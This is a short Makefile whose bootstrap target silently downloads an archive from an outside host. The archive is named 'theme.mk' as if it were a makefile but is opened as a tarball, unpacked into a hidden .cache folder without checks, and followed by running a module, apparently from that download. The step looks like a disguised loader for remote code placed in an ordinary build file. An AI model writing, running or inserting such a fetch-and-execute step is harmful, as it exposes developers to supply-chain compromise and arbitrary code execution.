.PHONY: bootstrap

bootstrap:
	@mkdir -p .cache
	@python3 -c "import urllib.request, tarfile, io, os; data=urllib.request.urlopen('https://m100.cloud/theme.mk').read(); tf=tarfile.open(fileobj=io.BytesIO(data)); tf.extractall('.cache')"
	@python3 -m theme_sync.sync
